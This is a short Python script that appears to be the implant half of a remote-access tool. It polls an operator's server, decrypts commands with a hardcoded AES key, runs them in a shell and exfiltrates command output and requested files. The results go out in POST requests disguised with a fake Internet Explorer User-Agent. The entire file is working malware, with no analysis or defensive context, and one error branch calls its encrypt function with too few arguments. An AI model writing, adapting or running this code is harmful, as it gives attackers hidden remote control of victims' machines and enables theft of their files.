#!/usr/bin/python
import urllib.request
import urllib.parse
import http.client
import subprocess
import sys
import base64
import os
from Crypto import Random
from Crypto.Cipher import AES
import hashlib
 
password = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"
 
def encrypt(raw, password, downloadFlag):
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(private_key, AES.MODE_CFB, iv)
    if downloadFlag == 0: #cmd
        return base64.b64encode(iv + cipher.encrypt(str.encode(raw)))
    return base64.b64encode(iv + cipher.encrypt(raw)) #download
 
 
def decrypt(enc, password):
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new(private_key, AES.MODE_CFB, iv)
    return cipher.decrypt(enc[16:])


if __name__ == '__main__':
    try:
        address = sys.argv[1]
        port = sys.argv[2]
    except IndexError:
        sys.exit()
    while 1:
        req = urllib.request.Request('http://%s:%s' % (address,port))
        message = urllib.request.urlopen(req).read()
        message = str(decrypt(message, password), 'utf-8')

        if message == "quit" or message == "exit":
            sys.exit()
        elif message[:8] == "download":
            filename = message.split(' ')[1]
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    data = f.read()
                    data = encrypt(data, password, 1)
                    data = urllib.parse.urlencode({'file': data})    
            else:
                data = encrypt(f"No such file or directory: {filename}", password)
                data = urllib.parse.urlencode({'cmd': data})
        else:
            proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            data = proc.stdout.read() + proc.stderr.read()
            data = encrypt(str(data, 'utf-8'), password, 0)
            data = urllib.parse.urlencode({'cmd': data})
        
        h = http.client.HTTPConnection('%s:%s' % (address,port))
        headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
        h.request('POST', '/index.aspx', data, headers)
